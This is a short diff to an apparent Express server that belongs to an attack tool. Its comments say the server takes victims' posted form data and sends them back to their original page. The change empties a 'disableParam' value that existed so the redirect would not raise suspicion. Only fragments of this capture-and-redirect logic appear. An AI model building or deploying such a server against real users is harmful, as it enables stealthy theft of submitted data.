@@ -13,7 +13,7 @@ var nextUserId = 0;
 //If we kept redirecting traffic here, we would raise suspicion
 //by attacking the availability of the resource.
 // 
-const disableParam = '?x=1';
+const disableParam = '';//'?x=1';
 
 app.use(bodyParser.urlencoded({
     extended: true
@@ -42,7 +42,6 @@ app.post('/', function(req, res) {
     //and redirect them back to where they were.
     res.redirect(req.body.redirect + disableParam);
 });
-
 
 console.log('Started on port 9999');
 app.listen(9999);
